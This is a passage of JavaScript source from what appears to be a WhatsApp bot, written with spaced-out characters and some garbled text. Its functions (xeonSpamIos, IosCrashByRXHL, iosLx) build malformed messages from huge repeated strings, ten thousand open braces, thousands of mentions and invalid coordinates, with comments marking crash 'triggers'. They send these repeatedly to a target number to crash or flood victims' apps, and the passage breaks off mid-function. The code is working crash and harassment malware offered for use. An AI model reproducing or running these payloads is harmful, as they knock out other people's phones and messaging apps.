 	 	 	 	 	 	 	 c a p t i o n :   " \ u 0 0 0 0 " , 
 	 	 	 	 	 	 	 m e d i a T y p e :   " I M A G E " , 
 	 	 	 	 	 	 	 j p e g T h u m b n a i l :   n u l l , 
 	 	 	 	 	 	 	 } , 
 	 	 	 	 	 	 	 e x t e r n a l A d R e p l y :   { 
 	 	 	 	 	 	 	 	 t i t l e :   " t r a s h   i o s   n e w "   +   "  " . r e p e a t ( 1 0 0 ) , 
 	 	 	 	 	 	 	 	 b o d y :   " F a i l   B e t a   -   (   c o r e s i x   ) "   +   "  " . r e p e a t ( 2 0 ) , 
 	 	 	 	 	 	 	 	 m e d i a T y p e :   " I M A G E " , 
 	 	 	 	 	 	 	 	 r e n d e r L a r g e r T h u m b n a i l :   t r u e , 
 	 	 	 	 	 	 	 	 p r e v i e w T y p e :   " I M A G E " , 
 	 	 	 	 	 	 	 	 t h u m b n a i l :   n u l l , 
 	 	 	 	 	 	 	 	 s o u r c e T y p e :   " m e s s a g e " , 
 	 	 	 	 	 	 	 	 s o u r c e I d :   " 7 6 2 " , 
 	 	 	 	 	 	 	 	 s o u r c e U r l :   " t . m e / m u l z y a p o c a l y p s e " , 
 	 	 	 	 	 	 	 	 m e d i a U r l :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
 	 	 	 	 	 	 	 	 c o n t a i n s A u t o R e p l y :   t r u e , 
 	 	 	 	 	 	 	 	 s h o w A d A t t r i b u t i o n :   t r u e , 
 	 	 	 	 	 	 	 } , 
 	 	 	 	 	 	 	 d i s a p p e a r i n g M o d e :   { 
 	 	 	 	 	 	 	 	 i n i t i a t o r :   ' I N I T I A T E D _ B Y _ M E ' 
 	 	 	 	 	 	 	 	 } , 
 	 	 	 	 	 	 	 	 p l a c e h o l d e r K e y :   { 
 	 	 	 	 	 	 r e m o t e J i d :   " 0 @ s . w h a t s a p p . n e t " , 
 	 	 	 	 	 	 f r o m M e :   f a l s e , 
 	 	 	 	 	 	 i d :   " 0 " 
 	 	 	 	 	 } } } } ,   { 
 	 	 	 	 	 p a r t i c i p a n t :   { 
 	 	 	 	 	 	 j i d :   J i d s 
 	 	 	 	 	 } } ) ; 
 	 	 } ; 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 
 c o n s t   {   x e o n K i n g I o s   }   =   r e q u i r e ( ' . / 6 9 / x K i n g I o s . j s ' ) ; 
 a s y n c   f u n c t i o n   x e o n S p a m I o s ( t a r g e t ) { 
 	 c o n s t   m s g   =   { 
         " v i e w O n c e M e s s a g e " :   { 
             " m e s s a g e " :   { 
                 " l i s t R e s p o n s e M e s s a g e " :   { 
                     " t i t l e " :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                     " l i s t T y p e " :   " S I N G L E _ S E L E C T " , 
                     " s i n g l e S e l e c t R e p l y " :   { } , 
                     " d e s c r i p t i o n " :   x e o n K i n g I o s 
                 } 
             } 
         } 
     } ; 
     c o n s t   a l l m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   p r o t o . M e s s a g e . f r o m O b j e c t ( m s g ) ,   { } ) ; 
     X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   a l l m s g . m e s s a g e ,   {   m e s s a g e I d :   a l l m s g . k e y . s e n d e r   } ) ; 
 	 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 a s y n c   f u n c t i o n   x e o n B e t a A I ( i s T a r g e t )   { 
     c o n s t   c a r d s   =   [ ] ; 
 
     / * c o n s t   m e d i a   =   a w a i t   p r e p a r e W A M e s s a g e M e d i a ( 
     {   v i d e o :   f s . r e a d F i l e S y n c ( ' . / X e o n M e d i a / C h e e m s - b o t . m p 4 ' )   } , 
     {   u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r   } 
 ) ; * / 
 
 c o n s t   m e d i a   =   { 
             v i d e o M e s s a g e :   { 
                 u r l :   ' h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 6 1 - 2 4 / 1 1 9 0 2 7 2 8 _ 7 0 7 9 9 8 2 2 8 5 1 0 2 6 6 _ 7 8 2 9 6 4 5 6 6 3 2 8 0 7 8 5 8 2 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 1 w E L 8 L 0 Z v w f y Q E A l 0 U j q n 4 y U q R i 7 N L Y B c l R O w M X x B - w i B A & o e = 6 8 8 8 2 4 2 3 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e ' , 
                 m i m e t y p e :   ' v i d e o / m p 4 ' , 
                 f i l e S h a 2 5 6 :   B u f f e r . f r o m ( ' j 0 y v 4 u u R P f X 3 Z O f y Z 0 t 8 i r S 7 K + M l u E O y o d g h g a n z b J Y = ' ,   ' b a s e 6 4 ' ) , 
                 f i l e L e n g t h :   ' 2 3 5 9 8 8 8 ' , 
                 m e d i a K e y :   B u f f e r . f r o m ( ' l d + S o E z J X i V s V a k u P u y R W r J f W f v J J Y a 0 C n o o C P D d Z W o = ' ,   ' b a s e 6 4 ' ) , 
                 f i l e E n c S h a 2 5 6 :   B u f f e r . f r o m ( ' k i b z t I x 3 / O 3 0 A I s + + t S P O Z E I o / S 7 a 6 I p B O 9 9 d 9 y c N Y k = ' ,   ' b a s e 6 4 ' ) , 
                 d i r e c t P a t h :   ' / v / t 6 2 . 7 1 6 1 - 2 4 / 1 1 9 0 2 7 2 8 _ 7 0 7 9 9 8 2 2 8 5 1 0 2 6 6 _ 7 8 2 9 6 4 5 6 6 3 2 8 0 7 8 5 8 2 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 1 w E L 8 L 0 Z v w f y Q E A l 0 U j q n 4 y U q R i 7 N L Y B c l R O w M X x B - w i B A & o e = 6 8 8 8 2 4 2 3 & _ n c _ s i d = 5 e 0 3 e 0 ' , 
                 m e d i a K e y T i m e s t a m p :   ' 1 7 5 1 1 6 1 0 7 3 ' , 
                 j p e g T h u m b n a i l :   B u f f e r . f r o m ( 
                     ' / 9 j / / g A Q T G F 2 Y z Y x L j E 5 L j E w M Q D / 2 w B D A A g G B g c G B w g I C A g I C A k J C Q o K C g k J C Q k K C g o K C g o M D A w K C g o K C g o K D A w M D A 0 O D Q 0 N D A 0 O D g 8 P D x I S E R E V F R U Z G R / / x A B x A A E B A Q E B A Q A A A A A A A A A A A A A H B g A I B A U B A Q E B A Q A A A A A A A A A A A A A A A A I A A w E Q A A I B A w M D A w Q D A Q A A A A A A A A E C A w U E E R I A B j E H E y I h F C N i U X F h F Y E y E Q A D A Q A C A w E A A A A A A A A A A A A A A Q I R Q T E D c R I h / 8 A A E Q g A G A A g A w E i A A I R A A M R A P / a A A w D A Q A C E Q M R A D 8 A m + 0 / b S h c 1 p l 7 e V K S 9 V 4 L k R K L e W O N d O g N k 6 o n J P 8 A u 7 1 e x H C X z i e q + x x 7 3 M S g / o t b D P 7 G d m n b f k F d p N t F a 0 / 5 a 2 t 1 d S e d r S 1 S a X y r G v j X X I j q g I z 0 w 3 4 2 k 3 v E 6 3 U Q J J r e o S k h m B k k H k d 3 C 4 d w 8 m A 2 l c e o Y G e g 2 H e c N + j S P F 9 r X U z 1 2 f D q / b P t z S s J J e 3 6 y u z r G j 3 0 B Z y g L M R H H b v J p A B J d g i f d s 6 5 V Q + N W F K t 7 i l y V A 3 j T n y p O P o L A 2 Q g V z G j N I M A t 0 9 m 6 d N o l r 2 j 5 J 8 j 5 7 m y h Z 5 B 9 K a S Q s k b N 6 l J R G L E r 6 S S c Y L E / j c 3 3 N 4 Z V + P 0 2 G o 1 G 7 i u P l z L H o Q y e i T 1 S H S r K i J G R 0 V R / J 9 z t J t 8 B q Z n f 3 T z 9 u e a 8 a 4 / S 7 i z r K 1 P y G 6 M 8 T 2 Q T T h o g h 1 Z k U 5 B G Q C C N 2 q 9 1 + B x R X S R P y K M 3 W j W 5 j i f T o l E g 8 a t N o X J G C A M E E j G + f N 7 f Q j 7 F 3 T 4 V C 1 0 E u e Q i O 4 g j j A N v A 0 k b J M J W c E z 6 D q w F w U / 5 9 j n c h 3 F 5 r x u v U u K z o 3 9 o z m 7 W 4 l a + V A o C x s u I y J X x k t n S F A 2 Y 7 2 4 j / / Z ' , 
                     ' b a s e 6 4 ' 
                 ) 
             } 
         } ; 
 
     c o n s t   h e a d e r   =   { 
         v i d e o M e s s a g e :   m e d i a . v i d e o M e s s a g e , 
         h a s M e d i a A t t a c h m e n t :   f a l s e , 
         c o n t e x t I n f o :   { 
             f o r w a r d i n g S c o r e :   6 6 6 , 
             i s F o r w a r d e d :   t r u e , 
             s t a n z a I d :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   D a t e . n o w ( ) , 
             p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
             r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
             q u o t e d M e s s a g e :   { 
                 e x t e n d e d T e x t M e s s a g e :   { 
                     t e x t :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                     c o n t e x t I n f o :   { 
                         m e n t i o n e d J i d :   [ " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] , 
                         e x t e r n a l A d R e p l y :   { 
                             t i t l e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                             b o d y :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                             t h u m b n a i l U r l :   " " , 
                             m e d i a T y p e :   1 , 
                             s o u r c e U r l :   " h t t p s : / / t a m a . e x a m p l e . c o m " , 
                             s h o w A d A t t r i b u t i o n :   f a l s e   / /   t r i g g e r   1 
                         } 
                     } 
                 } 
             } 
         } 
     } ; 
 
     f o r   ( l e t   r   =   0 ;   r   <   1 5 ;   r + + )   { 
         c a r d s . p u s h ( { 
             h e a d e r , 
             n a t i v e F l o w M e s s a g e :   { 
                 m e s s a g e P a r a m s J s o n :   " { " . r e p e a t ( 1 0 0 0 0 )   / /   t r i g g e r   2 
             } 
         } ) ; 
     } 
 
     c o n s t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( 
         i s T a r g e t , 
         { 
             v i e w O n c e M e s s a g e :   { 
                 m e s s a g e :   { 
                     i n t e r a c t i v e M e s s a g e :   { 
                         b o d y :   { 
                             t e x t :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " 
                         } , 
                         c a r o u s e l M e s s a g e :   { 
                             c a r d s , 
                             m e s s a g e V e r s i o n :   1 
                         } , 
                         c o n t e x t I n f o :   { 
                             b u s i n e s s M e s s a g e F o r w a r d I n f o :   { 
                                 b u s i n e s s O w n e r J i d :   " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " 
                             } , 
                             s t a n z a I d :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 ) ,   / /   t r i g g e r   3 
                             f o r w a r d i n g S c o r e :   1 0 0 , 
                             i s F o r w a r d e d :   t r u e , 
                             m e n t i o n e d J i d :   [ " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] ,   / /   t r i g g e r   4 
                             e x t e r n a l A d R e p l y :   { 
                                 t i t l e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , 
                                 b o d y :   " " , 
                                 t h u m b n a i l U r l :   " h t t p s : / / e x a m p l e . c o m / " , 
                                 m e d i a T y p e :   1 , 
                                 m e d i a U r l :   " " , 
                                 s o u r c e U r l :   " h t t p s : / / e x a m p l e . c o m " , 
                                 s h o w A d A t t r i b u t i o n :   f a l s e 
                             } 
                         } 
                     } 
                 } 
             } 
         } , 
         { } 
     ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( i s T a r g e t ,   m s g . m e s s a g e ,   { 
         p a r t i c i p a n t :   {   j i d :   i s T a r g e t   } , 
         m e s s a g e I d :   m s g . k e y . i d 
     } ) ; 
 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 c o n s t   I o s C r a s h B y R X H L   =   a s y n c   ( X )   = >   { 
       t r y   { 
             l e t   l o c a t i o n M e s s a g e   =   { 
                   d e g r e e s L a t i t u d e :   - 9 . 0 9 9 9 9 2 6 2 9 9 9 , 
                   d e g r e e s L o n g i t u d e :   1 9 9 . 9 9 9 6 3 1 1 8 9 9 9 , 
                   j p e g T h u m b n a i l :   n u l l , 
                   n a m e :   " R x h l O f c "   +   " � � � � � � � � " . r e p e a t ( 1 5 0 0 0 ) , 
                   a d d r e s s :   " R x h l O f c "   +   " � � � � � � � � " . r e p e a t ( 5 0 0 0 ) , 
                   u r l :   ` h t t p s : / / l o l . c r a z y a p p l e . $ { " � � � � � � � � " . r e p e a t ( 2 5 0 0 0 ) } . c o m ` , 
             } 
             l e t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( X ,   { 
                   v i e w O n c e M e s s a g e :   { 
                         m e s s a g e :   { 
                               l o c a t i o n M e s s a g e 
                         } 
                   } 
             } ,   { } ) ; 
             l e t   e x t e n d M s g   =   { 
                   e x t e n d e d T e x t M e s s a g e :   { 
                         t e x t :   " 馃 懆 馃 徔 鈥 嶐 煃 �   饾 樋 谭 饾 櫄 饾 櫕 饾 櫎 饾 櫑 饾 櫒 谭 饾 櫈 饾 櫗 饾 櫂 饾 櫎 饾 櫑 饾 櫄 谭 _ , - , _   馃 И 饾 棓 谭 饾 椈 饾 棻   # 谭   饾 棪 谭 饾 椀 饾 椉 饾 槃 饾 棦 谭 饾 棾 饾 棔 饾 槀 饾 棿 谭   @ 饾 棝 谭 饾 棶 饾 椊 饾 暋 饾 槅 饾 棖 谭 饾 椉 饾 椇 饾 櫌 饾 槀 饾 椈 饾 椂 饾 榿 饾 櫘   馃 檲 \ n \ n #   _   -   h t t p s : / / t . m e / r x h l v r o   -   _   # " , 
                         m a t c h e d T e x t :   " h t t p s : / / t . m e / r x h l v r o " , 
                         d e s c r i p t i o n :   " 鈥 硷 笍 R X H L O F C 鈥 硷 笍 "   +   " 饝 噦 饝 喌 饝 喆 饝 喛 " . r e p e a t ( 1 5 0 0 0 ) , 
                         t i t l e :   " 鈥 硷 笍 R X H L O F C 鈥 硷 笍 "   +   " 饝 噦 饝 喌 饝 喆 饝 喛 " . r e p e a t ( 1 5 0 0 0 ) , 
                         p r e v i e w T y p e :   " N O N E " , 
                         j p e g T h u m b n a i l :   " / 9 j / 4 A A Q S k Z J R g A B A Q A A A Q A B A A D / 4 g I o S U N D X 1 B S T 0 Z J T E U A A Q E A A A I Y A A A A A A I Q A A B t b n R y U k d C I F h Z W i A A A A A A A A A A A A A A A A B h Y 3 N w A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A Q A A 9 t Y A A Q A A A A D T L Q A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A l k Z X N j A A A A 8 A A A A H R y W F l a A A A B Z A A A A B R n W F l a A A A B e A A A A B R i W F l a A A A B j A A A A B R y V F J D A A A B o A A A A C h n V F J D A A A B o A A A A C h i V F J D A A A B o A A A A C h 3 d H B 0 A A A B y A A A A B R j c H J 0 A A A B 3 A A A A D x t b H V j A A A A A A A A A A E A A A A M Z W 5 V U w A A A F g A A A A c A H M A U g B H A E I A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A F h Z W i A A A A A A A A B v o g A A O P U A A A O Q W F l a I A A A A A A A A G K Z A A C 3 h Q A A G N p Y W V o g A A A A A A A A J K A A A A + E A A C 2 z 3 B h c m E A A A A A A A Q A A A A C Z m Y A A P K n A A A N W Q A A E 9 A A A A p b A A A A A A A A A A B Y W V o g A A A A A A A A 9 t Y A A Q A A A A D T L W 1 s d W M A A A A A A A A A A Q A A A A x l b l V T A A A A I A A A A B w A R w B v A G 8 A Z w B s A G U A I A B J A G 4 A Y w A u A C A A M g A w A D E A N v / b A E M A B g Q F B g U E B g Y F B g c H B g g K E A o K C Q k K F A 4 P D B A X F B g Y F x Q W F h o d J R 8 a G y M c F h Y g L C A j J i c p K i k Z H y 0 w L S g w J S g p K P / b A E M B B w c H C g g K E w o K E y g a F h o o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K C g o K P / A A B E I A I w A j A M B I g A C E Q E D E Q H / x A A c A A A C A w E B A Q E A A A A A A A A A A A A C A w Q G B w U B A A j / x A B B E A A C A Q I D B A Y G B w Q L A A A A A A A A A Q I D B A U G E Q c S I T F B U X O S s d E T F i Z 0 s s E U I i U 2 V X G T J F N j c h U j M j M 1 Q 0 V U Y m S R / 8 Q A G w E A A w E B A Q E B A A A A A A A A A A A A A A E C B A M F B g f / x A A x E Q A C A Q M C A w M L B Q A A A A A A A A A A A Q I D B B E F E h M h M T V B U R Q V M 2 F x g Y K h s c H R F j I 0 Q 5 H / 2 g A M A w E A A h E D E Q A / A L u m E m J i x i Z 4 p + b Z y M Q a Y p M J M A 6 D k w 4 s S m G m I t M e m E m J T G J g U m M T D T F J h J g U N T C T F p h J g A 1 M N M S m G m A x y Y a Y m L C T E U P R 6 L i w k w K T K c m M j I S m E m W Y R 6 Y S Y q L D T E U M T D i x S Y S Y g 6 D 0 w k x K Y a Y F p j 0 w k x M W M T A p M Y m G m K T C T A o a m E m K T D T A B q Y c W J T D T A Y 1 M Y n w E x Y S Y i i o J h J i U z 1 z 0 L M Q 9 M O M i C 6 + n S e x r r r E N M 6 C k G p E B V 1 1 h x r r r A e S c p B x k Q V X X W H C s n 0 i H k n K Q S l o R P T J L m D 9 I X W B a Z 0 F I N S O c r h d Y c b h d Y D y d F M J M h w r J 9 I 3 0 g F Z J K k G m R F V X W N h P U B 5 J K Y S Y q L C 1 A Z T 9 e Y m t P d Q x 9 J E u p c G U Y m y / w C z / L O G Y 3 h F S 5 v 6 d S d R V X F b s 2 k k k h W 0 j L m G 4 D h F t c 4 f C p C p O u q b 3 p u S a 3 W / k d z Y 6 9 c t V u 3 l 4 I j b b n p l q y 9 7 X w T N r h H g 5 x z P q X b U f N n E 2 L d t 6 4 5 n N 2 c Z d w 7 H c I u L m / h U n U h X d N b s 2 k k o x f z F 7 R c C s M B t r O p Y R n B 1 J u M t 6 b f Q d b Y k 9 c t X n v c v g g I 2 2 y 3 c P w 3 t Z f C J w j w M 4 5 k S t q S 0 z i 7 V u w u f f 1 B 2 f 5 c w 7 G s D l d X s K k 6 q r S g t J t L R J e Y G f s B s M E s 7 W r Y x n C U 5 u M t 6 b f D Q 6 + x 1 7 2 U 5 v / s z 8 I i d s D 0 w u x 7 Z + A O E e D n H M 6 T t q P m 3 i b V u w u e O Z V 8 l 2 V v i 2 O Q t b t S l S d O U m o v T i j Q f U j B e m j V / V Z Q d l 0 t c 1 0 1 / B n 4 G o 5 l v q m G 4 F e X l B R d W j T c o q X L U L e M X T c p I r S a F C V q 6 l W K e G + 4 5 i y R g v 7 m r + q z 1 Z K w Z f 5 N X 9 R l E j t J x d r + 6 t e 6 / M 7 m T c 5 4 h j O P U b K 5 p 0 I 0 5 x k 2 4 R a f B a 9 Z U Z 0 Z P C X y L p X W n V Z q E Y L L 9 Q W a s q 0 s P s 5 X m H y n u U / 7 d O T 1 0 X W m V S 0 k q t 1 Q p y 1 3 Z z j F / k 2 a v m z 7 u X / Z M x / D Z f t 9 r 2 s P F H C 4 h G M 1 g w 6 p b 0 6 F x F Q W E / w A m r e q O E / u q n 6 j K L i l K F p i 9 z b 0 d V T p z 0 j q 9 T W j J M x S 9 p L 7 t P k j p d Q j G K w j X r N v S p U o u n F L n 3 H t O W q G E e k + A 5 M x H z 5 T m + Z D u 3 9 V k h v i y J d v 6 r K M O c o 1 v Y 1 9 2 a 3 v E v B E X b m 9 M s W X v k f g m S d j P 3 Y r e 8 S 8 E R N v G v q v Y 7 q b / A G y P L + S Z v / o 9 x 9 j L s j 4 Q 9 h r 1 y x e e + S + C B H 2 4 v T D s N 7 a X w j d h G v q v e 7 y a f 0 y X N f 8 A C B H 2 7 b 3 9 G 4 Z u p v 8 A r p c v 5 R P + O R L s h e x f U 6 2 x l 6 5 R n 7 z P w i J 2 x v T C r D t n 4 B 7 F d f U + e 8 m n 9 J n z / K I r b L / h W H 9 s / A b 9 B 7 j p P s n 4 V 9 i t 7 K 3 7 W 0 + x n 4 G w X 9 p R v r S r b X U N + j V W 7 K O u m q M d 2 V f e 6 n 2 M / A 1 D O V z W t M s Y j c W 1 S V O t T p O U Z x 5 p i t n i k 2 x 6 P J R s p S k s p N / Q h L I + X 1 y s V 3 5 e Z L w z K + E Y Z e R u r K 2 9 H X i m l L e b 5 m M w z b j r X H F L j / 0 s u z z M G K 4 h m m 3 t 7 y + r V q M o T b h J 8 H p E U K 1 N y S U T l b 6 j Z 1 K s Y w p Y b f g i z b T c X q 2 d j T s a M J J X O u / U 0 4 a L o / M z v D H 9 o W n a w 8 U a 7 n e 2 p X O W r 3 0 0 F J 0 4 b 8 H 1 N d J j 2 G P 7 Q t O 1 h 4 o 5 X K a q J s y 6 x G S u 4 u T y n j H q N + M h z G / a W / 7 T 5 I 1 4 x / M j 9 p r / A L T 5 I 7 X n 7 U e h r v o o + 3 7 H l J 8 B y I 9 F 8 B y Z 5 5 8 w i m 6 8 S P c r V M a e S W 8 i 2 Y E + 4 0 7 Y v d 0 Z Y N d 2 m + v T 0 6 z m 4 6 8 d 1 p c T Q q t K n W i o 1 a c J p P X S S T P z X b V r m w u Y 3 F l W q U K 0 e U 4 P R n X e d M z L g s T q d y P k a 6 d w o x 2 t H 0 t j r l O h Q j S q x f L w N 9 p U q d G L j S p w g m 9 d I p I + q 0 a V Z J V a c J p c t 6 K Z g a z p m b 8 S n 3 Y + Q S z n m X 8 S n 3 I + R f l U P A 2 / q K 2 6 b X 8 v y b 1 S p 0 6 U d 2 l C M I 8 9 I r R G c b Y 7 q l K 3 s L S M k 6 y m 6 j j 1 L T Q q M M 4 Z j k t J Y l U 7 s f I 5 t W d e 7 r y r 3 V W d W r L n O b 1 b O d W 4 U o 7 U j H f 6 1 T u K D p U o t Z 8 S w 7 K o 6 Z t p v + D P w N l u a F K 6 o T o 3 E I 1 K U 1 p K M l q m j A s P u r n D b p X F j V d K s k 0 p J d D O k 8 2 5 g 6 M Q n 3 Y + R N G v G E d r R G m 6 p S t a H C q R b 5 + o 1 d Z Z w V f 6 b a / p o f Z 4 J h t l X V a 0 s q F K q u C n C G j R k S z b m H 8 Q n 3 Y + Q c c 1 4 / 0 3 8 + 7 H y O n l N P w N q 1 q z T y q b / w A X 5 N N z v d U r f L V 4 q k k n U j u R X W 2 Z D h k P t C 0 7 W H i h 1 7 f X 2 J 1 I z v 7 i p W a 5 b z 4 L 8 k B T i 4 S j O D a l F p p 9 T M 9 W r x J Z P J v 7 9 X d Z V E s J G 8 m P 5 l X t N f 8 A a f I N Z n x r / e z 7 q 8 i B O p U u L i d a v J z q z e s p P p Z V e v G o k k a 9 S 1 K n e Q U Y J r D 7 x 9 I d q R 4 c B u p m P I R T I s I T F j I s 6 H n J h 6 J 8 z 3 c R 4 m G m I v J 8 q a 6 g 1 S R 4 m M i 9 R F J p n s Y J D Y p I B B p g W g 1 F N H y g j 5 M N M B n y g g 4 w X U e I J M Q x k Y o N I C L D T A p B K K G R 4 C 0 w k w D o O i w 0 + A m L G J i L T K W m H F i U 9 G G m d T z s j o s N M T F h p i K T H J h J i k w 0 x F D o s N M Q m M i w O k Z D k w 4 s S m G m I t D k w k x U W G m A x i Y y L E p h J g A 9 M J M V G Q a Y i h i Y a Y p M J M A K c n q e p 6 M C I Z 0 M b W Q 0 w 0 x K 5 h o C U x y Y a Y m I a Y i k x y Y S Y p c x g i h 0 W E m J X M Y m I 6 R Y 1 M O L E o N A W O T C T F R f H Q N A M Y m M j I U E g A c m F q K i w 0 x F H / / Z " , 
                         t h u m b n a i l D i r e c t P a t h :   " / v / t 6 2 . 3 6 1 4 4 - 2 4 / 3 2 4 0 3 9 1 1 _ 6 5 6 6 7 8 7 5 0 1 0 2 5 5 3 _ 6 1 5 0 4 0 9 3 3 2 5 7 4 5 4 6 4 0 8 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I Z 5 m A B G g k v e 1 I J a S c U x g n P g p z t I P f _ q l i b n d h h t K E s 9 O & o e = 6 8 0 D 1 9 1 A & _ n c _ s i d = 5 e 0 3 e 0 " , 
                         t h u m b n a i l S h a 2 5 6 :   " e J R Y f c z Q l g c 1 2 Y 6 L J V X t l A B S D n n b W H d a v d S h A W W s r o w = " , 
                         t h u m b n a i l E n c S h a 2 5 6 :   " p E n N H A q A T n q l P A K Q O s 3 9 b E U X W Y O + b 9 L g F F + a A F 0 Y f 8 k = " , 
                         m e d i a K e y :   " 8 y j j 0 A M i R 6 + h 9 + J U S A / E H u z d D T a k x q H u S N R m T d j G R Y k = " , 
                         m e d i a K e y T i m e s t a m p :   " 1 7 4 3 1 0 1 4 8 9 " , 
                         t h u m b n a i l H e i g h t :   6 4 1 , 
                         t h u m b n a i l W i d t h :   6 4 0 , 
                         i n v i t e L i n k G r o u p T y p e V 2 :   " D E F A U L T " 
                   } 
             } 
             l e t   m s g 2   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( X ,   { 
                   v i e w O n c e M e s s a g e :   { 
                         m e s s a g e :   { 
                               e x t e n d M s g 
                         } 
                   } 
             } ,   { } ) ; 
             a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( ' s t a t u s @ b r o a d c a s t ' ,   m s g . m e s s a g e ,   { 
                   m e s s a g e I d :   m s g . k e y . i d , 
                   s t a t u s J i d L i s t :   [ X ] , 
                   a d d i t i o n a l N o d e s :   [ { 
                         t a g :   ' m e t a ' , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ { 
                               t a g :   ' m e n t i o n e d _ u s e r s ' , 
                               a t t r s :   { } , 
                               c o n t e n t :   [ { 
                                     t a g :   ' t o ' , 
                                     a t t r s :   { 
                                           j i d :   X 
                                     } , 
                                     c o n t e n t :   u n d e f i n e d 
                               } ] 
                         } ] 
                   } ] 
             } ) ; 
             a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( ' s t a t u s @ b r o a d c a s t ' ,   m s g 2 . m e s s a g e ,   { 
                   m e s s a g e I d :   m s g 2 . k e y . i d , 
                   s t a t u s J i d L i s t :   [ X ] , 
                   a d d i t i o n a l N o d e s :   [ { 
                         t a g :   ' m e t a ' , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ { 
                               t a g :   ' m e n t i o n e d _ u s e r s ' , 
                               a t t r s :   { } , 
                               c o n t e n t :   [ { 
                                     t a g :   ' t o ' , 
                                     a t t r s :   { 
                                           j i d :   X 
                                     } , 
                                     c o n t e n t :   u n d e f i n e d 
                               } ] 
                         } ] 
                   } ] 
             } ) ; 
       }   c a t c h   ( e r r )   { 
             c o n s o l e . e r r o r ( e r r ) ; 
       } 
 } ; 
 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 
 
         
         a s y n c   f u n c t i o n   i o s L x ( t a r g e t )   { 
     f o r ( l e t   z   =   0 ;   z   <   1 0 0 ;   z + + )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
             g r o u p S t a t u s M e s s a g e V 2 :   { 
                 m e s s a g e :   { 
                     l o c a t i o n M e s s a g e :   { 
                         d e g r e e s L a t i t u d e :   2 1 . 1 2 6 6 , 
                         d e g r e e s L o n g i t u d e :   - 1 1 . 8 1 9 9 , 
                         n a m e :   ` � � ⃟ ꙰ 。 ⌁ � � � � � �   � � � � � �   ⃰ � � .   -   � � � � � � � � � � � � � � `   +   " � � � � � � � � " . r e p e a t ( 6 0 0 0 0 ) , 
                         u r l :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
                         c o n t e x t I n f o :   { 
                             m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h : 2 0 0 0   } ,   ( _ ,   z )   = >   ` 6 2 8 $ { z   +   1 } @ s . w h a t s a p p . n e t ` ) ,   
                             e x t e r n a l A d R e p l y :   { 
                                 q u o t e d A d :   { 
                                     a d v e r t i s e r N a m e :   " � � � � � � � � " . r e p e a t ( 6 0 0 0 0 ) , 
                                     m e d i a T y p e :   " I M A G E " , 
                                     j p e g T h u m b n a i l :   Z e p p I m g ,   
                                     c a p t i o n :   " � � � � � � � � " . r e p e a t ( 6 0 0 0 0 ) 
                                 } , 
                                 p l a c e h o l d e r K e y :   { 
